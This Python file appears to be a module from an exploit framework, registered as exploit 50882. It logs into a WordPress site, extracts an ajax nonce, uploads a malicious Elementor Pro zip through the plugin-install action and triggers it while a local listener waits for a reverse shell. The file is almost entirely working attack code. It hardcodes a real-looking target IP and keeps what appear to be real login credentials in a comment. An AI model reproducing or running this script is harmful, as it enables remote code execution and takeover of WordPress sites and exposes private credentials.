from urllib.parse import urljoin

from ExploitModule.auxiliary_module.auxiliary_func import AuxiliaryFunc, ListenonPort
from .ExpBase import ExpBase
from ..ExploitFactory import ExploitFactory, exp_register
import threading
import requests
import re

class EXP50882(threading.Thread):
    def __init__(self, lhost, lport, rhost, rport):
        threading.Thread.__init__(self)
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport
        self.baseUrl = 'http://162.14.97.39/wordpress/'
        

        
    def __get_usr_info(self):
        self.username = input("username:")
        self.passwd = input("passwd:")
        
        """self.username = "1240660511@qq.com"
        self.passwd = "1240660511"""
    
    def __get_nonce(self):
        
        self.__get_usr_info()
        
        self.session = requests.Session()
        cookies = {
            'wordpress_test_cookie': 'WP+Cookie+check'
        }
        adminUrl = self.baseUrl + 'wp-admin/'
        loginUrl = self.baseUrl + 'wp-login.php'
        data = {
            'log': self.username,
            'pwd': self.passwd,
            'wp-submit': 'Login',
            'redirect_to': adminUrl,
            'testcookie': 1
        }
        
        response = self.session.post(loginUrl, data=data, cookies=cookies)
        
        rex = re.compile('"ajax":\\{"url":".+admin\\-ajax\\.php","nonce":"(.+)"\\}')
        search = rex.search(response.text)
        
        if not search:
            print('Error - Invalid credentials?')
        else:
            self.nonce = search.group(1)
        
    def __uploadFile(self):
        uploadUrl = urljoin(self.baseUrl, 'wp-admin/admin-ajax.php')
        fileName = r"./ExploitModule/auxiliary_module/payloads/elementor-pro.zip"
        data = {
            'action': 'elementor_upload_and_install_pro',
            '_nonce': self.nonce
        }
        files = {
            'fileToUpload': open(fileName, "rb")
        }
        
        response = self.session.post(uploadUrl, data = data, files=files)
        rex = re.compile('"elementorProInstalled":true')
        search = rex.search(response.text)
        
        if not search:
            print('Error - Upload failed')
            return False
        
        else:
            print ('Upload completed successfully!')
            return True
    def __activatePayload(self):
        print("正在连接。。。")

        #payloadUrl = urljoin(self.baseUrl, 'index.php?activate=1')
        self.session.get(self.baseUrl)
        
    def run(self):
        self.__get_nonce()
        self.__uploadFile()
        self.__activatePayload()

@exp_register('50882')  
class Exploit_50882(ExpBase):
    def __init__(self, target_ip, target_port):
        super().__init__(target_ip, target_port)
        
        aux = AuxiliaryFunc()
        self.local_ip, self.local_port = aux.local_ip_port()
        
    def exploit(self):
        thread2 = ListenonPort(self.local_port)
        thread1 = EXP50882(self.local_ip, self.local_port, self.target_ip, self.target_port)
        
        thread2.start()
        thread1.start()
        
        thread1.join()
        thread2.join()
        
        print("Finished.")
        